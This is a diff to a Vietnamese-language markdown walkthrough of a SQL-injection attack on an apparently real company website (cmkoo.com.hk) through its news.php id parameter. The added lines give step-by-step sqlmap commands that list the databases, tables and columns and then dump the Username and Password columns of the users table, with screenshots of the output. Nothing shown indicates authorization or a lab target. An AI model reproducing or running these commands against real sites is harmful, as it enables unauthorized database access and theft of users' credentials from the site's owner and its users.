@@ -1,6 +1,6 @@
 # TỔNG QUAN # 
 
-Kiểm tra trên web "CMKOO" `[http://www.gis.gov.bd/en/gis_file.php?id=9](http://www.cmkoo.com.hk/en/news/news.php?id=28)`
+Kiểm tra trên web "CMKOO" `http://www.cmkoo.com.hk/en/news/news.php?id=28`
 
 
 ## CÁC BƯỚC
@@ -44,5 +44,25 @@ Trang sử dụng MySQL theo thông tin ở `error info`
 
 ## Sử dụng `sqlmap`
 
+**1. Lấy thông tin database**
 
+`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 --dbs`
+
+![image](https://github.com/user-attachments/assets/a8c0f32a-3c0d-4bfd-9aa0-15cd070e5962)
+
+**2. Lấy các bảng trong database**
+
+`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk --tables`
+
+![image](https://github.com/user-attachments/assets/49aa44d3-efee-4abb-8872-04a7e1720bb4)
+
+**3. Lấy các cột trong bảng**
+
+`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk -T users --columns`
+
+![image](https://github.com/user-attachments/assets/c8328f5e-fbad-48d3-a7d8-39fef550ca8f)
+
+**4. Lấy thông tin trong cột**
+
+`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk -T users -C Username,Password --dump`
 
